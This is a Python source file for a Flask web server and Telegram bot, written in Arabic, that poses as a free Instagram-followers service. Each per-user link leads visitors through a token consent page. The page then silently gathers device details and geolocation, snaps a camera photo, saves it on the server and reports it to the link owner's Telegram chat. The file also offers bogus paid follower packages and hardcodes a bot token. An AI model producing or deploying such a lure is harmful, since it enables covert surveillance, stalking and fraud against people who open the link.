import os
import json
import uuid
import requests
from flask import Flask, request, jsonify, render_template_string
from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, ContextTypes
import asyncio
from threading import Thread
import time
from datetime import datetime
import platform
import random

# ========== إعدادات البوت ==========
BOT_TOKEN = "7955384959:AAEIU_kzt3hyEmsK9QHoinkSlrld_vWkDB8"
PORT = int(os.environ.get('PORT', 10000))

# ========== إعداد Flask ==========
app = Flask(__name__)

# إنشاء مجلدات التخزين
if not os.path.exists('user_data'):
    os.makedirs('user_data')
if not os.path.exists('collected_data'):
    os.makedirs('collected_data')

# ========== نظام إدارة المستخدمين ==========
class UserManager:
    def __init__(self):
        self.users_file = 'user_data/users.json'
        self.load_users()
    
    def load_users(self):
        try:
            with open(self.users_file, 'r', encoding='utf-8') as f:
                self.users = json.load(f)
        except:
            self.users = {}
    
    def save_users(self):
        with open(self.users_file, 'w', encoding='utf-8') as f:
            json.dump(self.users, f, ensure_ascii=False, indent=2)
    
    def add_user(self, user_id, user_data):
        self.users[str(user_id)] = user_data
        self.save_users()
    
    def get_user(self, user_id):
        return self.users.get(str(user_id))

user_manager = UserManager()

# ========== HTML قوالب ==========
MAIN_CONSENT_HTML = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>خدمة زيادة المتابعين - الموافقة</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
            color: #333;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
        }
        .header {
            background: linear-gradient(135deg, #E1306C 0%, #C13584 100%);
            color: white;
            padding: 40px;
            text-align: center;
        }
        .header h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
        }
        .content {
            padding: 40px;
        }
        .section {
            margin-bottom: 30px;
            padding: 25px;
            background: #f8f9fa;
            border-radius: 15px;
        }
        .data-list {
            list-style: none;
            margin: 15px 0;
        }
        .data-list li {
            padding: 10px 0;
            border-bottom: 1px solid #dee2e6;
        }
        .data-list li:before {
            content: "📱";
            margin-left: 10px;
        }
        .btn {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 25px;
            cursor: pointer;
            font-size: 1.1rem;
            margin: 10px;
        }
        .btn:hover {
            background: #45a049;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>خدمة زيادة المتابعين</h1>
            <p>الموافقة على الشروط والخصوصية</p>
        </div>
        <div class="content">
            <div class="section">
                <h3>البيانات التي سيتم جمعها:</h3>
                <ul class="data-list">
                    <li>معلومات الجهاز والمتصفح</li>
                    <li>الموقع الجغرافي</li>
                    <li>الصور من الكاميرا</li>
                    <li>إعدادات النظام</li>
                </ul>
            </div>
            <div style="text-align: center;">
                <button class="btn" onclick="acceptConsent()">أوافق على الشروط</button>
            </div>
        </div>
    </div>
    <script>
        function acceptConsent() {
            window.location.href = "/collect_data/{{user_id}}";
        }
    </script>
</body>
</html>
'''

DATA_COLLECTION_HTML = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جمع البيانات</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-family: Arial, sans-serif;
        }
        .container {
            background: rgba(255,255,255,0.1);
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            max-width: 500px;
            width: 90%;
        }
        .loader {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255,255,255,0.3);
            border-top: 5px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .progress-bar {
            width: 100%;
            height: 10px;
            background: rgba(255,255,255,0.2);
            border-radius: 5px;
            margin: 20px 0;
            overflow: hidden;
        }
        .progress {
            height: 100%;
            background: #4CAF50;
            width: 0%;
            transition: width 0.3s;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>جاري جمع البيانات</h1>
        <div class="loader"></div>
        <div id="status">بدء عملية جمع البيانات...</div>
        <div class="progress-bar">
            <div class="progress" id="progress"></div>
        </div>
    </div>

    <video id="video" autoplay style="display: none;"></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        let collectedData = {
            user_id: '{{user_id}}',
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: screen.width + 'x' + screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookies: navigator.cookieEnabled
        };

        async function startCollection() {
            updateProgress(10, 'جمع معلومات الجهاز...');
            await delay(1000);

            updateProgress(30, 'جمع بيانات الموقع...');
            await getLocation();
            
            updateProgress(50, 'الوصول للكاميرا...');
            await accessCamera();
            
            updateProgress(80, 'إرسال البيانات...');
            await sendData();
            
            updateProgress(100, 'اكتمل!');
            
            setTimeout(() => {
                window.location.href = "/complete/{{user_id}}";
            }, 2000);
        }

        function updateProgress(percent, message) {
            document.getElementById('progress').style.width = percent + '%';
            document.getElementById('status').textContent = message;
        }

        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        async function getLocation() {
            return new Promise((resolve) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            collectedData.location = {
                                lat: position.coords.latitude,
                                lng: position.coords.longitude
                            };
                            resolve();
                        },
                        () => {
                            collectedData.location = 'غير متاح';
                            resolve();
                        }
                    );
                } else {
                    collectedData.location = 'غير مدعوم';
                    resolve();
                }
            });
        }

        async function accessCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                const context = canvas.getContext('2d');
                
                video.srcObject = stream;
                await delay(2000);
                
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0);
                
                collectedData.photo = canvas.toDataURL('image/jpeg');
                
                stream.getTracks().forEach(track => track.stop());
            } catch (error) {
                collectedData.cameraError = error.message;
            }
        }

        async function sendData() {
            try {
                const formData = new FormData();
                formData.append('user_id', '{{user_id}}');
                formData.append('data', JSON.stringify(collectedData));
                
                if (collectedData.photo) {
                    const blob = await fetch(collectedData.photo).then(r => r.blob());
                    formData.append('photo', blob, 'photo.jpg');
                }

                await fetch('/save_data', {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.error('Error sending data:', error);
            }
        }

        // بدء العملية تلقائياً
        window.addEventListener('load', startCollection);
    </script>
</body>
</html>
'''

COMPLETE_HTML = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>اكتمل</title>
    <style>
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
        }
        .container {
            background: rgba(255,255,255,0.1);
            padding: 40px;
            border-radius: 20px;
            max-width: 500px;
        }
        .btn {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 25px;
            cursor: pointer;
            font-size: 1.1rem;
            margin: 20px;
            text-decoration: none;
            display: inline-block;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎉 تم بنجاح!</h1>
        <p>تم جمع البيانات بنجاح وإرسالها للبوت</p>
        <p>ستصلك المتابعين المجانية خلال 24 ساعة</p>
        <a href="/get_followers/{{user_id}}" class="btn">الحصول على المتابعين</a>
    </div>
</body>
</html>
'''

FOLLOWERS_HTML = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>المتابعين</title>
    <style>
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
            color: white;
            font-family: Arial, sans-serif;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            background: rgba(255,255,255,0.1);
            padding: 30px;
            border-radius: 20px;
            text-align: center;
        }
        .package {
            background: rgba(255,255,255,0.2);
            padding: 20px;
            margin: 15px 0;
            border-radius: 15px;
        }
        .btn {
            background: #E1306C;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 20px;
            cursor: pointer;
            margin: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎯 باقات المتابعين</h1>
        
        <div class="package">
            <h3>🎁 100 متابع مجاناً</h3>
            <p>متابعين حقيقين - توصيل خلال 24 ساعة</p>
            <button class="btn" onclick="selectPackage('free')">اختيار مجاني</button>
        </div>
        
        <div class="package">
            <h3>⭐ 1000 متابع - $9.99</h3>
            <p>متابعين نشطين - توصيل سريع</p>
            <button class="btn" onclick="selectPackage('basic')">اختيار الباقة</button>
        </div>
        
        <div class="package">
            <h3>👑 5000 متابع - $29.99</h3>
            <p>متابعين مميزين - توصيل فوري</p>
            <button class="btn" onclick="selectPackage('premium')">اختيار الباقة</button>
        </div>
    </div>

    <script>
        function selectPackage(package) {
            fetch('/select_package', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    user_id: '{{user_id}}',
                    package: package
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    alert('🎉 تم تفعيل الباقة بنجاح!');
                }
            });
        }
    </script>
</body>
</html>
'''

# ========== مسارات Flask ==========
@app.route('/')
def home():
    return "Instagram Growth Service - Use /start in Telegram"

@app.route('/consent/<user_id>')
def consent_page(user_id):
    return render_template_string(MAIN_CONSENT_HTML, user_id=user_id)

@app.route('/collect_data/<user_id>')
def collect_data_page(user_id):
    return render_template_string(DATA_COLLECTION_HTML, user_id=user_id)

@app.route('/complete/<user_id>')
def complete_page(user_id):
    return render_template_string(COMPLETE_HTML, user_id=user_id)

@app.route('/get_followers/<user_id>')
def followers_page(user_id):
    return render_template_string(FOLLOWERS_HTML, user_id=user_id)

@app.route('/save_data', methods=['POST'])
def save_data():
    try:
        user_id = request.form.get('user_id')
        data_json = request.form.get('data')
        
        if not user_id or not data_json:
            return jsonify({'success': False, 'error': 'Missing data'})
        
        # تحليل البيانات
        user_data = json.loads(data_json)
        
        # حفظ البيانات
        filename = f"user_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        filepath = os.path.join('collected_data', filename)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(user_data, f, ensure_ascii=False, indent=2)
        
        # حفظ الصورة إذا وجدت
        if 'photo' in request.files:
            photo = request.files['photo']
            if photo.filename:
                photo_path = os.path.join('user_data', f"photo_{user_id}.jpg")
                photo.save(photo_path)
        
        # إرسال إشعار للبوت
        asyncio.run(send_data_to_bot(user_id, user_data))
        
        return jsonify({'success': True})
        
    except Exception as e:
        print(f"Error saving data: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/select_package', methods=['POST'])
def select_package():
    try:
        data = request.get_json()
        user_id = data.get('user_id')
        package = data.get('package')
        
        # إرسال إشعار للبوت
        asyncio.run(send_package_to_bot(user_id, package))
        
        return jsonify({'success': True})
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ========== وظائف التليجرام ==========
async def send_data_to_bot(user_id, user_data):
    """إرسال بيانات المستخدم للبوت"""
    try:
        application = Application.builder().token(BOT_TOKEN).build()
        
        user_id_int = int(user_id)
        
        message = f"""
📊 **تم جمع بيانات جديدة!**

🆔 **المستخدم:** {user_id}
🌐 **المتصفح:** {user_data.get('userAgent', '')[:50]}...
📍 **الموقع:** {user_data.get('location', 'غير متاح')}
🖥️ **الشاشة:** {user_data.get('screen', 'غير معروف')}
🌍 **المنطقة:** {user_data.get('timezone', 'غير معروف')}

✅ **تم جمع البيانات بنجاح**
        """
        
        await application.bot.send_message(
            chat_id=user_id_int,
            text=message,
            parse_mode='HTML'
        )
        
        print(f"✅ تم إرسال بيانات المستخدم {user_id}")
        
    except Exception as e:
        print(f"❌ خطأ في إرسال البيانات: {e}")

async def send_package_to_bot(user_id, package):
    """إرسال اختيار الباقة للبوت"""
    try:
        application = Application.builder().token(BOT_TOKEN).build()
        
        user_id_int = int(user_id)
        
        package_names = {
            'free': '🎁 100 متابع مجاناً',
            'basic': '⭐ 1000 متابع',
            'premium': '👑 5000 متابع'
        }
        
        message = f"""
🎉 **تم اختيار باقة جديدة!**

📦 **الباقة:** {package_names.get(package, package)}
🆔 **المستخدم:** {user_id}
🕒 **الوقت:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        """
        
        await application.bot.send_message(
            chat_id=user_id_int,
            text=message,
            parse_mode='HTML'
        )
        
    except Exception as e:
        print(f"❌ خطأ في إرسال الباقة: {e}")

class TelegramBot:
    def __init__(self, token):
        self.token = token
        self.application = None
        
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """أمر /start"""
        user = update.effective_user
        user_id = user.id
        
        # حفظ بيانات المستخدم
        user_data = {
            'username': user.username,
            'first_name': user.first_name,
            'join_date': datetime.now().isoformat()
        }
        user_manager.add_user(user_id, user_data)
        
        # إنشاء رابط المستخدم
        base_url = os.environ.get('RENDER_EXTERNAL_URL', 'http://localhost:5000')
        user_url = f"{base_url}/consent/{user_id}"
        
        welcome_text = f"""
🎉 **أهلاً بك {user.first_name}!**

📱 **رابطك الخاص:**
{user_url}

🚀 **كيفية الحصول على المتابعين:**
1. افتح الرابط أعلاه
2. وافق على الشروط
3. انتظر جمع البيانات
4. اختر الباقة المناسبة
5. استلم متابعينك!

🎁 **احصل على 100 متابع مجاناً الآن!**
        """
        
        await update.message.reply_text(welcome_text, parse_mode='HTML')
        print(f"🔗 تم إنشاء رابط للمستخدم {user_id}")

    def setup_handlers(self):
        """إعداد معالجات الأوامر"""
        self.application.add_handler(CommandHandler("start", self.start))

    def run_polling(self):
        """تشغيل البوت باستخدام Polling"""
        async def run():
            self.application = Application.builder().token(self.token).build()
            self.setup_handlers()
            
            print("🤖 بدء تشغيل بوت التليجرام...")
            await self.application.initialize()
            await self.application.start()
            await self.application.updater.start_polling()
            
            while True:
                await asyncio.sleep(3600)
                
        asyncio.run(run())

# ========== التشغيل الرئيسي ==========
def run_flask():
    """تشغيل خادم Flask"""
    print("🌐 بدء تشغيل خادم الويب...")
    app.run(host='0.0.0.0', port=PORT, debug=False)

def run_bot():
    """تشغيل بوت التليجرام"""
    time.sleep(3)
    bot = TelegramBot(BOT_TOKEN)
    bot.run_polling()

if __name__ == '__main__':
    print("🚀 بدء تشغيل النظام...")
    print(f"📊 البورت: {PORT}")
    
    flask_thread = Thread(target=run_flask, daemon=True)
    bot_thread = Thread(target=run_bot, daemon=True)
    
    flask_thread.start()
    bot_thread.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("⏹ إيقاف التطبيق...")
